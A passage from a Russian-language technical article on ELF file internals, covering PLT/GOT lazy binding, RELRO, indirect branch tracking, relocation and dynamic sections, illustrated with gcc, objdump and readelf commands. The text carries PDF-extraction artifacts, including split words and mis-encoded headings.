ства Linux режим позднего связывания реализует ся динамическим ком понов-
щиком по умолчанию. Можно заставить динамический ком поновщик произво-
дить разрешение адресов фун кций из разделяемых библиотек непосредствен -
но во время заг рузки прог раммы, задав перемен ную среды LD_BIND_NOW:


export LD_BIND_NOW= 1

Повторюсь, необходимость исполь зовать режим немед ленного связывания
возникает крайне ред ко, разве что если требует ся обеспечить гаран тирован -
ную производитель ность в системах с режимами, близкими к режимам реаль -
ного времени.
   Для начала рассмот рим базовый прин цип позднего связывания в ELF-фай-
лах, который был реализован изначаль но. После чего поговорим о том, какие
изменения были внесены в этот базовый прин цип, ког да появились новые тех-
нологии защиты прог рамм от атак.
   Для боль шей наг лядности нем ного изменим наш «хелловорлд» и добавим
в него еще одну фун кцию (например, exit()):


    #include <stdio.h>
    #include <stdlib.h>
    void main(int argc, char* argv[])
    {
        printf("Hello world\n");
        exit(0);
    }

Чтобы  получить ELF-файл с базовым  прин ципом  позднего  связывания,
откомпилиру ем   дан ный   пример   c   исполь зованием   опции   -fcf-
protection=none. Эта опция показы вает ком пилятору, что нужно собрать
прог рамму без исполь зования защит ной  технологии  IBT  (indirect  branch
tracking):


gcc -o example_exit_notrack -fcf-protection=none example_exit.c

Об опциях gcc можно почитать в докумен тации.
   Итак, в базовом варианте в ELF-файлах позднее связывание реализует ся
с помощью двух специаль ных сек ций:
 • .plt — таблица связей и процедур (Procedure Linkage Table);
 • .got — таблица глобаль ных смещений (Global Oﬀset Table).


Ñåêöèÿ .got
Начнем с сек ции .got. Для начала обратим внимание, что эта сек ция имеет
тип SHT_PROGBITS (то есть содержит либо код, либо дан ные, и в нашем слу чае
это дан ные), а так же флаг SHF_WRITE (то есть ее содержимое может менять ся
в ходе выполнения прог раммы).
  Первый элемент этой сек ции — адрес динамического раздела, содер-
жимое которого, как мы уже говорили, составляет сек ция .dynamic (о ней мы
поговорим чуть позже). Далее идет место для хранения адреса струк туры
link_map (ее содержимое можно посмотреть в файле /usr/include/link.h)
и место для хранения адреса фун кции _dl_runtime_resolve() (эта фун кция
из состава динамического заг рузчика, с помощью которой он и определяет
адрес нужной нам фун кции из той или иной разделяемой библиотеки).





                  Первые три элемен та сек ции .got

Места для хранения адресов link_map и _dl_runtime_resolve() заполняют -
ся реаль ными значениями при запуске прог раммы.
  Далее в .got идут места хранения адресов вызываемых фун кций (в нашем
слу чае это фун кции puts() и exit()). Если вниматель но на них посмотреть
(при этом не забывая про обратный порядок следования байтов), мы увидим,
что первоначаль ные значения этих адресов ведут куда-то в область сек ции .
plt, а не в область, где может быть заг ружена нужная нам библиотека glibc.
Это, в общем-то, и есть ключевой момент динамического разрешения адре-
сов. Он зак лючается в том, что в нужное время в таблицу глобаль ных сме-
щений запишут ся требуемые нам адреса фун кций из разделяемых библиотек.
За это как раз и отвечает динамический заг рузчик и таблица связей и процедур
.plt.


Ñåêöèÿ .plt
Первое, что бросает ся в глаза при изу чении дан ной сек ции, — в отличие
от сек ции .got, сек ция .plt имеет флаг SHF_EXECINSTR. То есть ее содер-
жимое может быть выполнено, при этом сек ция пред назначена толь ко для чте-
ния.
   Каждый элемент в .plt — это кусочек исполняемого кода. Первый из этих
элемен тов общий и выполняет ся при вызове всех фун кций. Каждый из пос-
леду ющих элемен тов относит ся к какой-либо одной фун кции из разделяемой
библиотеки. Фун кция не вызывается непосредствен но из библиотеки — сна-
чала выполняет ся соот ветству ющий элемент .plt, который уже затем вызыва-
ет саму фун кцию (такой под ход обычно называют трам плином).
   Каждому элемен ту таблицы .plt соот ветству ет один из элемен тов таблицы
.got, который должен содержать реаль ный адрес вызываемой фун кции. Но мы
видим, что в таблице .got лежат не совсем те адреса, что нам требуют ся.
Как же в нужный момент там окажут ся реаль ные адреса вызываемых фун кций?
  Все очень просто: динамический заг рузчик с помощью уже знакомой нам
фун кции _dl_runtime_resolve() сам определит и запишет в нужное место
адрес фун кции во время ее первого вызова (или же сразу при заг рузке прог -
раммы в память, если установлена перемен ная окру жения LD_BIND_NOW).
   Итак, для более полного пог ружения попробу ем с помощью утилиты
objdump дизассем блировать сек цию .plt нашего файла:


objdump -M intel --section .plt -d example_exit_notrack

и проделать то же самое с сек цией .text:


objdump -M intel --section .text -d example_exit_notrack




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





                        РАЗБИРАЕМ УСТРОЙСТВО
                                  ELF-ФАЙЛОВ
                            В ПОДРОБНОСТЯХ




После этого найдем среди получен ного кода фун кцию main().





     Сек ция .plt и фун кция main() сек ции .text файла example_exit_notrack

Мы видим, что в main() вызовы фун кций puts() и exit() ведут в таблицу .
plt. Сама таблица .plt в нашем слу чае состоит из трех элемен тов: первый
элемент в этой таблице общий (и это справед ливо для любых прог рамм,
независимо  от  количества  вызываемых  фун кций),  осталь ные  относят ся
к вызываемым фун кциям (их обычно именуют заг лушками). В нашем слу чае
второй элемент .plt относит ся к фун кции puts(), а третий — к фун кции exit(
).
  При первом вызове фун кции, к примеру фун кции puts(), в соот ветству -
ющем ей элемен те таблицы .got (там, где должен хранить ся адрес этой фун -
кции) записы вает ся адрес, который указывает внутрь таблицы .plt, как раз
на тот элемент, который и относит ся к фун кции puts().





    Первый вызов фун кции puts() при запуске файла example_exit_notrack

То есть при вызове в main() фун кции puts() (шаг 1 на предыду щем рисун ке)
мы попадаем на второй элемент таблицы .plt (в соот ветству ющую фун кции
puts() заг лушку). Первая коман да в этой заг лушке — это коман да косвенного
перехода по адресу, который хранит ся в таблице .got (шаг 2 на предыду щем
рисун ке).
   Если вниматель но посмотреть на адрес в таблице .got, то можно увидеть,
что это адрес следующей после jmp коман ды в заг лушке фун кции puts(),
в нашем слу чае это коман да push 0x0. Таким образом, первая коман да в заг -
лушке  фак тически  передает  управление  следующей  за  ней  коман де
(шаг 3 на предыду щем рисун ке). На первый взгляд, это не лучший способ
организовать последователь ное выполнение команд, однако, если проследить
ход выполнения прог раммы даль ше, все станет более понят но.
  Коман да push кладет в стек целое число (в нашем слу чае это 0x0). Это чис-
ло играет роль иден тификатора для определения нужной нам фун кции,
которую должен найти динамический заг рузчик в разделяемой библиотеке.
Следующая коман да (шаг 4 на предыду щем рисун ке) выполняет переход
на первый элемент таблицы .plt (так называемая заг лушка по умолчанию).
   Заг лушка по умолчанию с помощью коман ды push помещает в стек адрес
струк туры link_map, который берет ся так же из таблицы .got (выше мы уже
говорили,  в  каком месте  .got  должен  хранить ся  этот  адрес).  Далее
(шаг  5  на  предыду щем  рисун ке)  выполняет ся  переход  на  фун кцию
_dl_runtime_resolve(), адрес которой так же берет ся из .got. Таким обра-
зом, в качестве аргу мен тов фун кции _dl_runtime_resolve() выступает адрес
струк туры link_map и целочисленный иден тификатор фун кции, адрес которой
необходимо найти.
   Струк тура link_map пред ставляет собой двухсвязный список, каждый эле-
мент которого содержит имя заг ружен ной в память библиотеки, адрес ее заг -
рузки и адрес динамического раздела этой библиотеки (содержимое которого
составляет сек ция .dynamic, о ней мы под робнее поговорим чуть позже). Про-
ходя по этому списку, фун кция _dl_runtime_resolve() находит адрес раз-
мещения в памяти нужной библиотеки. Затем, исполь зуя информацию из .
dynamic и иден тификатор вызываемой фун кции, определяет адрес дан ной
фун кции. Далее этот адрес записы вает ся в нужное место в таблице .got, пос-
ле чего выполняет ся переход по нему в вызываемую фун кцию.
   Теперь при повторном вызове фун кции в соот ветству ющем элемен те таб-
лицы .got будет лежать реаль ный адрес вызываемой фун кции в библиотеке и,
соот ветствен но, нужная фун кция будет вызвана напрямую из таблицы .got
(шаг 3 на следующем рисун ке).





                  Повторный вызов фун кции puts()

Наверняка у тебя возник вопрос: зачем нужна сек ция .got, если можно сразу
записать адреса в соот ветству ющие места сек ции .plt? Все дело в безопас-
ности. Содержимое  сек ции  .plt,  как мы  уже  выяснили, имеет  флаг
SHF_EXECINSTR, а позволять вносить изменения в исполняемый код с точки
зрения безопасности не совсем хорошо. Соот ветствен но, чтобы не создавать
допускающие запись сек ции исполняемого кода, и был добавлен допол-
нитель ный уровень в виде таблицы .got.
  Ссылки на перемещаемые сим волы дан ных, определен ных во внеш них
библиотеках (к примеру, глобаль ные перемен ные, объявленные в разделя-
емых библиотеках с ключевым словом extern), тоже должны быть перенап-
равлены с исполь зованием таблицы .got. Однако в отличие от фун кций ссылки
на дан ные проходят через .got без посредничества .plt.
   Иног да таблица глобаль ных смещений в ELF-файле может быть пред став-
лена дву мя сек циями .got и .got.plt. В этом слу чае сек ция .got пред назна-
чена для ссы лок на элемен ты дан ных (и заполняет ся она сразу при запуске
прог раммы), а сек ция .got.plt — для хранения разрешен ных адресов фун -
кций из разделяемых библиотек (при этом для доступа к ним исполь зует ся
таблица .plt). К  примеру,  если  ском пилировать наш  example_exit.c
с помощью ком пилятора clang:


clang -o example_clang example_exit.c

то получим таблицу глобаль ных смещений в виде двух сек ций.





                  Сек ции .got и .got.plt в ELF-файле

Кстати, clang, в отличие от gcc, при ком пиляции нашего хелловорлда не опти-
мизирует код (не заменяет printf() puts()).
   То же самое может быть и с таблицей связей процедур. Мы рассмот рели
толь ко сек цию с именем .plt, однако на самом деле в нашем примере
example_exit_notrack, ском пилирован ном с помощью gcc, можно увидеть
еще одну сек цию — .plt.got.
  Дизассем блировав  ее,  получим  заг лушку,  содержащую  толь ко  один
переход в область сек ции .got (для вызова фун кции __cxa_finalize()
из библиотеки glibc), без занесения в стек иден тификатора вызываемой фун -
кции и без вызова заг лушки по умолчанию.





          Дизассем блирован ная сек ция .plt.got в ELF-файле

Работа дан ной заг лушки из .plt.got пред полагает запись в нужное место
сек ции .got реаль ного адреса вызываемой фун кции сразу во время запуска
прог раммы (так же как и в слу чае с дан ными). Соот ветствен но, выполняет ся
прямой вызов нужной фун кции по этому адресу, как во время первого вызова,
так и при последу ющих.
   Этот механизм применяется, ког да нужно исполь зовать адрес фун кции
в прог рамме до ее первого вызова. К примеру, если дизассем блировать сек -
цию .text (имен но в ней располагается основной выполняемый прог раммой
код), мы  увидим,  что  значение  адреса  уже  знакомой  нам  фун кции
__cxa_finalize() исполь зует ся до того, как появляет ся необходимость ее
вызывать.
   Если задать перемен ную окру жения LD_BIND_NOT:


LD_BIND_NOT= 1

то таблица глобаль ных смещений обновлять ся не будет  (то есть в нее
не запишут ся реаль ные адреса фун кции) и каждый вызов фун кции отработа-
ется    как   первый    (с   задействованием   возможностей   фун кции
_dl_runtime_resolve()).
  Наличие или отсутствие сек ций .got.plt и .plt.got зависит от исполь -
зуемого ком пилятора и применения тех или иных опций при ком пиляции прог -
рамм. К примеру, в файле example_clang, ском пилирован ном при помощи
clang, сек ция.plt.got отсутству ет.


Àòàêè ñ ïîìîùüþ ïåðåçàïèñè .got è çàùèòà îò íèõ
Несмотря на отсутствие у сек ций .got и .got.plt флага SHF_EXECINSTR (это
означает, что содержимое сек ции не может быть выполнено), доступность этих
сек ций для перезаписи дает возможность провести атаку, записав в таблицу
глобаль ных смещений адрес дру гой фун кции или ROP-гад жета. Чтобы этого
избежать, можно ском пилировать файл с применением защит ного механизма
под названием Relocation Read-Only (RELRO). Этот защит ный механизм имеет
два режима — частичный и полный. Для включения того или иного режима
необходимо при ком пиляции исполь зовать опцию -z (на самом деле эта опция
относит ся к лин ковщику ld, и при исполь зовании ее с gcc она ему переда-
ется):
 • -z norelro — не применять RELRO к ком пилиру емой прог рамме;
 • -z lazy — частичная защита;
 • -z now — полная защита.

При частичной защите сек ции .got и .got.plt (если они присутству ют в ELF-
файле) размещаются перед сек циями дан ных прог раммы .data и .bss. Тем
самым снижает ся риск переполнения буфера глобаль ной перемен ной. Так же
при наличии сек ции .got.plt в сек цию .got запись во время выполнения зап-
рещена (а мы пом ним, что в этом слу чае дан ные в нее записы вают ся толь ко
при запуске прог раммы). То есть в ней реализовано ран нее связывание,
которое происходит в момент запуска прог раммы.
  В сек цию же .got.plt писать в ходе выполнения приложения не возбра-
няет ся. Как видишь, по боль шому счету частичный режим RELRO на самом
деле мало от чего защищает. Проверить, с каким режимом RELRO была ском -
пилирована прог рамма, можно с помощью неболь шой утилиты checksec.
  В режиме с полным RELRO, помимо того, что сделано в частичном, добав-
ляет ся запрет на изменение всей таблицы глобаль ных смещений (и сек ции .
got, и сек ции .got.plt). Как ты наверняка догадался, в этом слу чае никакого
позднего связывания реализовано не будет. Все адреса экспортиру емых
из внеш них библиотек фун кций и дан ных будут разрешены и записаны в таб-
лицу глобаль ных смещений при запуске прог раммы. Если экспортиру емых
фун кций много, приложение может заг ружать ся ощу тимо мед леннее.
   Весь разбор прин ципов динамического связывания мы проделали на при-
мере  ELF-файлов,  ском пилирован ных  с  опцией  -fcf-protection=none,
при исполь зовании которой защит ный механизм indirect branch tracking вык -
лючен. Сейчас посмотрим, какие особен ности вносит gcc в ELF-файлы
при включен ном indirect branch tracking. Для этого откомпилиру ем наш сегод -
няшний пример example_exit.c без опции -fcf-protection=none:


gcc -o example_exit example_exit.c

Работа indirect branch tracking основана на инструк ции процессора ENDBRANCH.
Она обозначает области в прог рамме, на которые можно делать косвенные
переходы с помощью инструк ций call или jmp (как раз такие переходы и дела-
ются с помощью сек ций .plt и .got). Если при косвенном переходе процес-
сор не встречает этой коман ды, то вызывается исключение.
   Итак, если посмотреть внутрь ELF-файла, ском пилирован ного с исполь -
зованием дан ного механизма защиты, мы увидим, что количество сек ций уве-
личилось. К сек циям .note.gnu.build-id и .note.ABI-tag добавилась сек -
ция note.gnu.property, а в таблице связей процедур к сек циям .plt и .plt.
got — сек ция .plt.sec.


Ñåêöèè .note.gnu.build-id, .note.ABI-tag è .note.gnu.property
Крат ко рассмот рим сек ции, название которых начинается с .note. Как можно
догадать ся из названия, эти сек ции что-то поясняют:
 • .note.gnu.build-id содержит уникаль ный иден тификатор сборки ELF-
  файла в виде значения из четырех байт;
 • .note.ABI-tag содержит иден тификатор версии ABI, слу жащий в том
   числе и для определения типа целевой операционной системы;
 • .note.gnu.property содержит дополнитель ные сведения о свойствах
   прог раммы, описывает особые требования к обработ ке для ком поновщика
   и динамического заг рузчика.

Посмотрим на содержимое этих сек ций, для чего восполь зуем ся readelf
с опцией -n:


readelf -n -W example_pie





  Содержимое разделов .note.gnu.build-id, .note.ABI-tag и .note.gnu.property

На рисун ке вид но, что в сек ции .note.gnu.property содержится информация
о включен ных механизмах защиты:  indirect branch tracking и shadow stack .
Более под робно про сек цию .note.gnu.property можно прочитать в рас-
сылке llvm-dev.
  А в этом докумен те описаны особен ности некоторых специаль ных сек ций
ELF-файлов, в том числе и сек ций .note.gnu.build-id, .note.ABI-tag и .
note.gnu.property.


Ñåêöèÿ .plt.sec è îòëè÷èÿ â ñåêöèÿõ .plt è .plt.got
Наличие этой сек ции вместе с сек циями .plt.got и .plt (наряду с соот ветс-
тву ющим признаком в .note.gnu.property) говорит о том, что в ELF-файле
исполь зует ся indirect branch tracking. Этот режим в GCC установлен по умол-
чанию (то есть если не указывать опцию -fcf-protection=none, то файл
будет откомпилирован с исполь зованием indirect branch tracking).
  Попробу ем дизассем блировать сек цию .plt.got:


objdump -M intel --section .plt.got -d example_exit





                          Сек ция .plt.got

Видим, что сек ция .plt.got не претерпела особых изменений по сравнению
с файлом, в котором вык лючен механизм защиты, кроме наличия в начале
коман ды endbr64. Кстати, коман да endbr64 (так же как и endbr32) на старых
процессорах воспринимается  как коман да nop  и, соот ветствен но, будет
работать без проблем на чипах, где дан ная коман да не реализована (понят но,
что indirect branch tracking в этом слу чае не сработает).
  Дизассем блировав код из сек ций .plt и .plt.sec, мы увидим, что в отли-
чие от файла без IBT часть кода из заг лушек фун кций puts() и exit(),
который ранее был размещен в сек ции .plt, перетек ла в сек цию .plt.sec.
А в начале каждого места в коде, куда может быть выполнен косвенный
переход, появилась коман да endbr64. Общий прин цип разрешения адресов
остался таким же, хотя ход вызова фун кции нем ного изменился.





          Ход вызова фун кции с задействованием сек ции .plt.sec

Ког да мы  исследовали прин цип динамического  связывания ELF-файлов
с внеш ними разделяемы ми библиотеками, мы говорили про иден тификатор
вызываемой фун кции, по значению которого фун кция _dl_runtime_resolve()
из состава динамического ком поновщика определяет, что за фун кцию необ-
ходимо найти. Возникает вопрос: а каким образом исходя из этого целочис-
ленного  значения  иден тификатора определяется имя  нужной фун кции?
Для этого в ELF-файле имеются таблицы перемещений с именами вида либо .
rel.*, либо .rela.*. Познакомим ся с ними поближе.


Ñåêöèè .rel. è .rela.
Все сек ции такого вида имеют тип SHT_RELA и содержат информацию, которую
динамический ком поновщик исполь зует для перемещений. Сек ции вида .rel.
* состоят из элемен тов, каждый из которых пред ставляет собой струк туру типа
Elf64_Rel или Elf32_Rel, в зависимости от разрядности ELF-файла. Сек ции
вида  .rela.*   состоят   из   элемен тов  со   струк турой  Elf64_Rela
или Elf32_Rela. Струк тура Elf64_Rela (Elf32_Rela) отличает ся от струк туры
Elf64_Rel (Elf32_Rel) наличием дополнитель ного поля r_addend, в котором
содержится добавка к переразмещаемому адресу. В боль шинстве слу чаев
в 32-разрядных прог раммах исполь зуют ся сек ции вида .rel.*, а в 64-раз-
рядных — сек ции вида .rela, при этом поле r_addend так же в боль шинстве
слу чаев равно нулю.
  По сути, каждый элемент сек ций .rel.* или .rela.* хранит адрес,
к которому нужно применить перемещение, и указание о том, как определить
кон крет ное значение, которое нужно записать по этому адресу.
   Итак, обратим ся к нашему подопыт ному ELF-файлу example_exit. Видим,
что в нем две сек ции — .rela.dyn и rela.plt. Первая говорит динамичес-
кому  ком поновщику,  как  переразмещать  адреса  фун кций  или  дан ных
без исполь зования таблицы связей процедур, вторая — как переразмещать
адреса фун кций, исполь зующих сек ции .plt, .plt.got или .plt.sec. Заг -
лянем внутрь этих сек ций (напом ню, что для этого необходимо исполь зовать
опцию -r утилиты readelf):


readelf -W -r example_exit





        Содержимое сек ций .rela.dyn и .rela.plt файла example_exit

Начнем с сек ции .rela.plt. Здесь все достаточно просто: каждая строка —
это один элемент сек ции, каждый из которых, в свою очередь, относит ся к той
или иной фун кции. В нашем слу чае первая строка относит ся к фун кции puts(),
вторая — к фун кции exit().
   Так вот, номер строки (и индекс элемен та в сек ции) соот ветству ет тому
значению иден тификатора фун кции, по которому _dl_runtime_resolve()
определяет имя нужной фун кции (при этом необходимо пом нить, что нумера-
ция почти всего и вся у нас начинается не с единицы, а с нуля). То есть иден -
тификатор со значением 0x0 соот ветству ет в нашем слу чае фун кции puts(),
а иден тификатор со значением 0x01 — фун кции exit(). Если вспом нить
дизассем блирован ный вид сек ции .plt, при вызове фун кции puts() в стек
кладет ся значение 0x0, а при вызове exit() — значение 0x01.
  Идем даль ше. Первый элемент строки показы вает адрес, по которому
динамический ком поновщик должен записать нужное значение (это поле
r_offset в струк туре Elf64_Rela или Elf32_Rela). Видим, что эти адреса
указывают на соот ветству ющие места сек ции .got. Второй элемент строки
(поле r_info) — это индекс сим вола, соот ветству ющего фун кции (содержится
в первых четырех байтах значения), и тип перемещения (который хранит ся
в оставшихся четырех байтах значения). Видим, что индекс сим вола для фун -
кции puts() равен 2, а индекс сим вола для фун кции exit() — 5. Если обра-
тить ся к сек ции .dynsym нашего подопыт ного экзем пляра, то увидим, что
индексу 2 в этой сек ции соот ветству ет сим вол фун кции puts(), а индексу 5 —
сим вол фун кции exit().





           Содержимое сек ции .dynsym файла example_exit

Сопоставив все это, фун кция _dl_runtime_resolve из динамического ком -
поновщика находит имя библиотечной фун кции, адрес которой нужно опре-
делить.
  Далее мы видим, что тип перемещения — R_X86_64_JUMP_SLOT. Дан ный
тип перемещения — это так называемый слот перехода, который показы вает,
что по адресу, содержащему ся в поле r_offset, нужно записать адрес соот -
ветству ющей фун кции из разделяемой библиотеки. Значение адреса в поле
r_offset, как ты уже наверняка догадался, будет принад лежать области таб-
лицы глобаль ных смещений. Типов перемещений существу ет много, про них
можно прочитать в статье Игнасио Сан миллана.
  В сек ции .rela.dyn содержится информация о перемещениях, которые
выполняют ся без участия таблицы связей процедур. Видим, что для нашего
файла example_exit она содержит восемь элемен тов. Первые два элемен та
показы вают    динамическому    ком поновщику,     что    по    адресу
0x0000000000003db0  нужно  поместить  значение  0x1160,  а  по  адресу
0000000000003db8 — значение 0x1120.
   Если посмотреть на список всех сек ций в файле, то мы увидим, что адрес
0x0000000000003db0 — это адрес начала сек ции .init_array, а адрес
0000000000003db8 — адрес начала сек ции .fini_array. Тип перемещения
R_X86_64_RELATIVE говорит о том, что по указан ному адресу нужно поместить
кон крет ное значение (в нашем слу чае это значения 0x1160 и 0x1120).
   Сек ция .init_array содержит массив указателей на фун кции, исполь -
зуемые как конструк торы. Это могут быть конструк торы глобаль ных классов,
если они инициализиру ются до вызова фун кции main(), либо фун кции,
которые можно определить самому (такая фун кция объявляется с помощью
конструк ции вида void __attribute__((constructor)) my_init_func()).
Фун кции сюда может вставлять и сам ком пилятор. Эти фун кции вызываются
по очереди во время заг рузки при инициализации ELF-файла, еще до вызова
фун кции main().
  Дан ная сек ция не связана с уже знакомой нам сек цией .init (ее мы рас-
смот рели в предыду щей статье), и фун кции, указатели на которые размеща-
ются в .init_array, вызываются после завершения фун кции _init(), которая
находит ся в сек ции .init.
   Сек ция .fini_array аналогична по струк туре сек ции .ini_array, толь ко
содержит адреса фун кций-деструк торов, которые вызываются после завер-
шения фун кции main(). Здесь так же могут присутствовать деструк торы гло-
баль ных классов, фун кции, объявленные самим прог раммистом (в этом слу чае
необходимо  объявить  такую  фун кцию,   как  void   __attribute__((
destructor))  my_destructor_func()), либо фун кции, вставленные ком -
пилятором.
   Здесь, в отличие от конструк торов глобаль ных классов (если они есть
в прог рамме), присутствие адресов которых в сек ции .init_array обязатель -
но, наличие адресов фун кций-деструк торов этих глобаль ных классов зависит
от режима ком пиляции. При ком пиляции с помощью GCC с опцией -fno-use-
cxa-atexit адреса деструк торов там будут присутствовать. В слу чае ком -
пиляции без этой опции адресов фун кций-деструк торов в сек ции не будет, а их
вызов после завершения прог раммы будет обеспечен исполь зованием фун -
кции __cxa_atexit().
  Вообще, ELF-файл может запускать ся, а фун кции могут вызывать ся до и
после основной фун кции main() по различным сценариям, зависящим от ком -
пилятора, от режимов и опций ком пиляции, от версии и разрядности Linux, да и
много от чего еще. Это достаточно объемный вопрос, но в целом общее пред -
ставление можно получить, прочитав вот эту статью.
  В нашем слу чае эти две сек ции содержат по одному адресу и, соот ветс-
твен но, при инициализации прог раммы и при ее завершении будет вызвана
одна фун кция (при инициализации — фун кция по адресу 0x0000000000001160,
при завершении — фун кция по адресу 0x0000000000001120). Если посмотреть
на дизассем блирован ный код сек ции .text нашего файла, то можно увидеть,
что  по  адресу  0x0000000000001160  находит ся  фун кция  с  именем
frame_dummy(). Ее вставил ком пилятор GCC, и имен но она будет вызвана
до вызова main(). А по адресу 0x0000000000001120 находит ся фун кция
__do_global_dtors_aux() (ее так же вставил в исполняемый код ком пилятор,
и она  будет  вызвана,  ког да  завершится выполнение фун кции main(),
перед вызовом фун кции _fini() из сек ции .fini).





           Фун кции frame_dummy() и __do_global_dtors_aux()




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





                        РАЗБИРАЕМ УСТРОЙСТВО
                                  ELF-ФАЙЛОВ
                            В ПОДРОБНОСТЯХ




Так же нужно отметить, что некоторые ELF-файлы исполь зуют сек ции .ctors
и .dtors с аналогичными фун кциями (это харак терно для старых версий GCC).
  Задача фун кции frame_dummy() — установить аргу мен ты и вызвать фун -
кцию register_tm_clones(), которая, в свою очередь, инициализиру ет тран -
закционную память . Эта память исполь зует ся для упрощения работы с потока-
ми. В нашем слу чае frame_dummy() никакие парамет ры не выставляет и тран -
закционная память не исполь зует ся.
  Фун кция __do_global_dtors_aux() вызывает фун кции-деструк торы, адре-
са которых содержатся в .fini_array или были зарегистрированы с помощью
фун кции __cxa_atexit(). В нашем слу чае таких фун кций-деструк торов нет,
поэтому дан ная фун кция при вызове не выполняет никакой полезной работы.
  Далее в сек ции .rela.dyn (в треть ей строке) видим нечто (а имен но число
0x4008),  что записы вает ся по адресу 0x0000000000004008. Это  адрес,
в который будет помещен дескриптор глобаль ного объекта (в слу чае его соз-
дания). Этим глобаль ным объектом может быть, например, тот самый экзем -
пляр класса, инициализирован ный до запуска фун кции main(). Указан ный дес-
криптор нужен для определения того, какой деструк тор необходимо вызвать
для кон крет ного глобаль ного объекта.
  После чего в сек ции идет информация о перемещении для несколь ких фун -
кций, которые GCC добавляет в код. Тип перемещения R_X86_64_GLOB_DAT
говорит ком поновщику, что по адресам, указан ным в поле r_offset каждой
записи сек ции, нужно поместить кон крет ные значения адресов этих фун кций,
по которым  они  размещены  в  тек сте  прог раммы. Сделать  это нужно
при запуске прог раммы, а не при первом вызове фун кции.
  В свою очередь, адреса, указан ные в поле r_offset каждой записи, лежат
в области таблицы глобаль ных смещений. То есть эти фун кции (в отличие
от фун кций puts() и exit()) будут вызывать ся напрямую без промежу точного
трам плина в виде таблицы связей процедур. Индексы сим волов этих фун кций
в сек ции .dynsym, так же как и в слу чае с фун кциями puts() и exit(), лежат
в первой половине значения поля r_info.
   Тип перемещения R_X86_64_GLOB_DAT  исполь зует ся для  размещения
адресов дан ных или адресов фун кций, значения которых могут понадобить ся
еще до вызова самих этих фун кций. Если посмотреть на дизассем блирован ный
код сек ции .tex нашего ELF-файла, то вид но, что имен но поэтому для дан ных
фун кций был выбран тип перемещения R_X86_64_GLOB_DAT.
   Если говорить о фун кциях, которые добавил GCC, то эти фун кции содер-
жатся в объектном модуле crtbeginS.o или библиотеке  glibc. Модуль
crtbeginS.o — это часть ком пилятора GCC (хотя фун кции из него могут
исполь зовать и дру гие ком пиляторы, например clang).
  Фун кции                           _ITM_deregisterTMCloneTable()
и _ITM_registerTMCloneTable() (из модуля crtbeginS.o, которые, в свою
очередь,  этот  модуль  дергает  из библиотеки  libitm.a)  исполь зуют ся
для организации работы с тран закционной памятью и вызываются из фун кций
register_tm_clones()  и  deregister_tm_clones(),  о  которых мы  уже
говорили выше.
  Фун кция __libc_start_main() (из библиотеки glibc) очень важна — имен -
но с этой фун кции по боль шому счету начинается выполнение прог раммы,
имен но она вызывается в фун кции _start(), определяет парамет ры коман -
дной строки и запускает уже основную фун кцию прог раммы main().
  Про фун кцию __gmon_start__() мы уже говорили в предыду щей статье, ее
задача — запустить профилировщик, если ELF-файл ском пилирован с опцией -
pg. Фун кция __cxa_finalize() (из библиотеки glibc) реализует запуск всех
деструк торов, адреса которых лежат в .fini_array или зарегистрированы
с   помощью   __cxa_atexit(),   она    как   раз   и   исполь зует ся
в __do_global_dtors_aux().


Ñåêöèÿ .dynamic
Это своеобразная дорожная карта для динамического ком поновщика во время
заг рузки и под готовки к выполнению ELF-файла. Каждая запись в этой сек ции
пред ставляет собой струк туру типа Elf64_Dyn (или Elf32_Dyn). В общем-то,
тип содержащейся в каждой записи информации определяется значением
поля тега d_tag, а все возможные значения тегов перечислены в файле /usr/
include/elf.h. Заг лянем внутрь сек ции .dynamic нашего подопыт ного ELF-
файла:


readelf -d -W example_exit





         Содержимое сек ции .dynamic ELF-файла example_exit

Из первой строчки, например, вид но (теги со значением DT_NEEDED сообщают
динамическому ком поновщику о зависимостях ELF-файла), что файл имеет
зависимость от разделяемой библиотеки libc.so.6 (это как раз та самая биб-
лиотека glibc, которая обеспечивает системные вызовы и основные фун кции).
Помимо этого, сек ция содержит в себе дру гие важные дан ные, необходимые
динамическому ком поновщику для работы. Например, адреса начала сек ций .
init и .fini (теги DT_INIT и DT_FINI соот ветствен но), адреса начала сек ций
.init_array и .fini_array (теги DT_INIT_ARRAY и DT_FINI_ARRAY) и их раз-
меры (теги DT_INIT_ARRAYSZ и DT_FINI_ARRAYSZ).
   Теги DT_VERNEED и DT_VERNEEDNUM информируют о началь ном адресе
и количестве записей для сек ции .gnu.version_r, в которой хранят ся ожи-
даемые номера версий зависимостей ELF-файла. Тег DT_VERSYM показы вает
началь ный адрес сек ции .gnu.version, в которой хранят ся зависимости
для каждого сим вола из сек ции .dynsym. На адрес начала сек ции .dynsym ука-
зывает тег DT_SYMTAB, в свою очередь, тег DT_SYMENT содержит размер одной
записи сек ции .dynsym.
   Типов тегов доволь но много, рассмот реть их все в рам ках статьи не пред -
ставляет ся возможным, однако ком ментарии в файле /usr/include/elf.h
достаточно исчерпы вающие и позволят лег ко определить, что означает тот
или иной тег.


Ñåêöèè .gnu.version, gnu.version_r è gnu.version_d
Сек ции .gnu.version, gnu.version_r содержат,  как мы определились,
информацию о зависимостях. Начнем с сек ции .gnu.version_r. Первое, что
необходимо отметить, — указан ная сек ция может содержать в себе одну
запись или более. Каждая запись относит ся к одному файлу библиотеки,
при этом одна запись (для одного файла библиотеки) может содержать
информацию о несколь ких зависимостях. То есть, к примеру, для файла биб-
лиотеки libc.so.6 может быть две зависимости GLIBC_2.2.5 и GLIBC_2.2.4,
может быть боль ше, а может и одна (например, толь ко GLIBC_2.2.5).
Для примера можно посмотреть зависимости какого-нибудь файла библиоте-
ки из состава операционной системы. Я взял /usr/lib/x86_64-linux-gnu/
libstdc++.so.6:


readelf -V -W libstdc++.so.6





     Зависимости из libc.so.6 в /usr/lib/x86_64-linux-gnu/libstdc++.so.6

Видим десять зависимостей из файла libc.so.6. Формат одной записи (для
одного   файла   библиотеки)   определен   струк турой   Elf64_Verned
или Elf32_Verned (напом ню, что все это можно посмотреть в файле /usr/
include/elf.h). Первый элемент этой струк туры (поле vn_version) содержит
номер версии струк туры записи о зависимостях (в настоящее время это зна-
чение равно единице). Далее идет число зависимостей в этой записи (поле
vn_cnt), после чего в поле vn_file — смещение на строку с именем файла
библиотеки в сек ции .dynstr. Следующее поле vn_aux — смещение на дан -
ные о первой зависимости, далее (поле vn_next) — на следующую запись
о зависимостях (уже для дру гого файла).
   Каждая   зависимость,   в  свою   очередь,   определена   струк турой
